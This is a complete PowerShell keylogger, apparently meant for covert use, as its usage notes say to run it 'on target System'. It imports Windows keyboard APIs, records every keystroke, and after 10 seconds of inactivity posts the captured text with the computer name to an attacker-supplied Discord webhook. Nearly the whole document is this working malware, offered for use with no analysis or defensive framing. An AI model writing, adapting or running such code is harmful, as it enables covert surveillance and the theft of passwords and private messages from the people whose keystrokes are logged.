<#


SYNOPSIS
This script gathers Keypress information and posts to a discord webhook address with the results only
when the keyboard is inactive for more than 10 seconds and only if keys were pressed before that.



USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>

# User Setup
$dc = "$dc"

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Add stopwatch for intellegent sending
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Start a continuous loop
While ($true){
  $keyPressed = $false
    try{
      # Start a loop that checks the time since last activity before message is sent
      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
      # Start the loop with 30 ms delay between keystate check
      Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        # Get the key state. (is any key currently pressed)
        $keyst = $API::GetAsyncKeyState($asc)
          # If a key is pressed
          if ($keyst -eq -32767) {
          # Restart the inactivity timer
          $keyPressed = $true
          $LastKeypressTime.Restart()
          $null = [console]::CapsLock
          # Translate the keycode to a letter
          $vtkey = $API::MapVirtualKey($asc, 3)
          # Get the keyboard state and create stringbuilder
          $kbst = New-Object Byte[] 256
          $checkkbst = $API::GetKeyboardState($kbst)
          $logchar = New-Object -TypeName System.Text.StringBuilder
            # Define the key that was pressed          
            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
              # Check for non-character keys
              $LString = $logchar.ToString()
                if ($asc -eq 8) {$LString = "[BKSP]"}
                if ($asc -eq 13) {$LString = "[ENT]"}
                if ($asc -eq 27) {$LString = "[ESC]"}
            # Add the key to sending variable
            $send += $LString 
            }
          }
        }
      }
    }
    finally{
      If ($keyPressed) {
      # Send the saved keys to a webhook
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
      #Remove log file and reset inactivity check 
      $send = ""
      $keyPressed = $false
      }
    }
  # reset stopwatch before restarting the loop
  $LastKeypressTime.Restart()
  Start-Sleep -Milliseconds 10
}
